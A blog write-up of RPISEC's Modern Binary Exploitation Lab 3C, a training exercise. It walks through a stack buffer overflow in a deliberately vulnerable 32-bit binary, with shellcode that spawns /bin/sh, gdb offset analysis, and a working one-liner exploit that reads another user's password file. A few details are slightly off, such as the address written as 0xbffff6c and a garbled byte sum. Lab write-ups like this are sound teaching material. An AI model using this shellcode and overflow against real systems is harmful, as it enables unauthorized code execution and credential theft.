---
layout: post
title: Baby's First Shellcode - MBE Lab 3C Writeup
tags: 
- ctf
- writeups
- MBE
- shellcode
---

I've been working through [RPISEC's course on Modern Binary Exploitation](https://github.com/RPISEC/MBE) as a refresher on reverse engineering and pwning. I've kept loose notes and writeups of the labs but want to write some more solid writeups here, so that future me can come back and read these in case I forget how to do them.

---

This first one will be on Lab 3C -- the first lab that requires **shellcoding**. The lab itself is the textbook example of exploiting a program vulnerable to shellcode injection. We're given a 32-bit [ELF](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format) binary (`lab3C`) and the corresponding source code:

**lab3C.c**
---

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* gcc -z execstack -fno-stack-protector -o lab3C lab3C.c */

char a_user_name[100];

int verify_user_name()
{
    puts("verifying username....\n");
    return strncmp(a_user_name, "rpisec", 6);
}

int verify_user_pass(char *a_user_pass)
{
    return strncmp(a_user_pass, "admin", 5);
}

int main()
{
    char a_user_pass[64] = {0};
    int x = 0;

    /* prompt for the username - read 100 byes */
    printf("********* ADMIN LOGIN PROMPT *********\n");
    printf("Enter Username: ");
    fgets(a_user_name, 0x100, stdin);

    /* verify input username */
    x = verify_user_name();
    if (x != 0){
        puts("nope, incorrect username...\n");
        return EXIT_FAILURE;
    }

    /* prompt for admin password - read 64 bytes */
    printf("Enter Password: \n");
    fgets(a_user_pass, 0x64, stdin);

    /* verify input password */
    x = verify_user_pass(a_user_pass);
    if (x == 0 || x != 0){
        puts("nope, incorrect password...\n");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}

```

Let's take a quick look at the above code. First, the user is prompted for a username, which is checked against the string `rpisec` using `strncmp`. If the input string is `rpisec`, then the user is allowed to proceed. Next, the user is prompted for a password, which is checked against the string `admin`, again using `strncmp`. This time, if the string equals or does not equal admin, the user is told that they have failed. Essentially, the user will always get this incorrect password message, which doesn't really matter to us since we're trying to execute a shell.

There are several telling signs that this is vulnerable to shellcode injection:

1. The compile flag `-z execstack` allows data on the stack to be executed as instructions
2. The compile flag `-fno-stack-protector` disables the detection mechanisms that guard against stack smashing.
3. The buffers `a_user_name` and `a_user_pass` are 100 bytes and 64 bytes respectively but the calls to `fgets` read in 0x100 and 0x64 bytes, allowing for buffer overflow.
4. The lab happens right after the shellcoding lecture, of course.

This gives us potentially 0x100 + 0x64 = 256 + 100 + 356 bytes (!!) to work with. Some of this will be padded with `\x90` for our [NOP sled](https://en.wikipedia.org/wiki/NOP_slide), but in the end, 356 bytes is more than enough to pop a shell.

Now let's grab a suitable piece of shellcode for x86 that we can use as part of our payload:

```asm
   0:   31 c0                   xor    eax,eax
   2:   50                      push   eax
   3:   68 2f 73 68 00          push   0x68732f
   8:   68 2f 62 69 6e          push   0x6e69622f
   d:   89 e3                   mov    ebx,esp
   f:   89 c1                   mov    ecx,eax
  11:   89 c2                   mov    edx,eax
  13:   b0 0b                   mov    al,0xb
  15:   cd 80                   int    0x80
  17:   31 c0                   xor    eax,eax
  19:   40                      inc    eax
  1a:   cd 80                   int    0x80
```

The above shellcode is roughly similar to this snippet of C code:

```c
exec("/bin/sh");
exit(0);
```

This will give us a shell as the owner of the program (`lab3B`) due to the way these lab binaries are set up. Our above shellcode is only 28 bytes in length, so we could put our entire payload within the space of `a_user_pass`, since we'll need to do a buffer overflow here anyways in order to modify the return address from `main()`. Note that it's entirely possible to put the payload in `a_user_name` and just have our modified return address from `main()` jump to that. This is due to the fact that `strncmp` is being used for the user name. So for our "username", we could enter `rpisec` followed by the payload and the program would happily accept our username since the first six characters match as expected. No matter what we put there, we still have to get to overflowing the `a_user_pass` buffer. For this, we need to figure out where the return address is in relation to the beginning of `a_user_pass`. Let's look at the first chunk of the assembly code of the `main()` function from running `objdump -d lab3C`:

```asm
08048790 <main>:
 8048790:       55                      push   %ebp
 8048791:       89 e5                   mov    %esp,%ebp
 8048793:       57                      push   %edi
 8048794:       53                      push   %ebx
```

It's important to note that `%edi` and `%ebx` are being pushed onto the stack, as they are [callee saved registers](https://en.wikipedia.org/wiki/X86_calling_conventions). In addition to this, we have `%ebp` pushed onto the stack (as is customary when entering a function in x86), as well as the `int` variable `i`, which during the `main()` function, lives at `$esp+0x5c`. This means that the beginning of `a_user_pass` is 64 (size of `a_user_pass`) + 4 (size of `i`) + 12 (combined size of `ebp`, `edi`, and `ebx`) = **80 bytes** before the return address we wish to overwrite. We can verify this in `gdb` by setting a breakpoint after the password is read in via `fgets()` in `main()` and seeing where our data was placed:

```sh
lab3C@warzone:/levels/lab03$ gdb lab3C
Reading symbols from lab3C...(no debugging symbols found)...done.
gdb-peda$ b *0x804883f
Breakpoint 1 at 0x804883f
gdb-peda$ r
Starting program: /levels/lab03/lab3C 
********* ADMIN LOGIN PROMPT *********
Enter Username: rpisec
verifying username....

Enter Password: 
AAAA
(... gdb peda context is omitted here for brevity ...)
gdb-peda$ x/28x $esp
0xbffff690:     0xbffff6ac      0x00000064      0xb7fcdc20      0xb7eb8216
0xbffff6a0:     0xffffffff      0xbffff6ce      0xb7e2fbf8      0x41414141
0xbffff6b0:     0x0000000a      0x00000000      0x00000000      0x00000000
0xbffff6c0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff6d0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff6e0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff6f0:     0xb7fcd000      0x00000000      0x00000000      0xb7e3ca83
```

We can see that `0x41414141` is the `AAAA` we input. Indeed, the return address `0xb7e3ca83` is **80 bytes** after the beginning of our buffer. All that's left to do is to find an address to jump to and then craft our final payload.

Since the bytes near the return address may get overwritten (`i` for example), let's put our shellcode such that it ends at least 16 bytes *prior* to the return address. Before our shellcode, we'll have our nop sled of `0x90`s. Our payload (in Python) looks like the following so far:

```python
SHELLCODE = "\x31\xc0\x50\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
RET_ADDR = "????"
print "rpisec" # Remember to input the username
print "\x90"*36 + SHELLCODE + "\x90"*16 + RET_ADDR
```

Notice that we're unsure what `RET_ADDR` should be. It just needs to be the address of somewhere in our NOP sled. In `gdb`, the beginning of `a_user_pass` was at `0xbffff6ac`. This address is different when the program is run without `gdb` and it's hard to say what the offset will be so it comes down to slight guesswork here. After trying a few addresses in the general range of the address I found in `gdb`, `0xbffff6c` ended up being the first one I found that worked. In addition to using Python to pipe our exploit into the binary, we need to also use `cat` so that our shell prompt is not exited out. Our final exploit is as follows:

```sh
(python -c 'print "rpisec"; print "\x90"*36 + "\x31\xc0\x50\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90"*16 + "\x8c\xf6\xff\xbf"'; cat;) | ./lab3C
```

And here it is in action:

```sh
lab3C@warzone:/levels/lab03$ (python -c 'print "rpisec"; print "\x90"*36 + "\x31\xc0\x50\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90"*16 + "\x8c\xf6\xff\xbf"'; cat;) | ./lab3C
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
lab3B
cat /home/lab3B/.pass
th3r3_iz_n0_4dm1ns_0n1y_U!
```

And we get the password for lab3B:

```
th3r3_iz_n0_4dm1ns_0n1y_U!
```
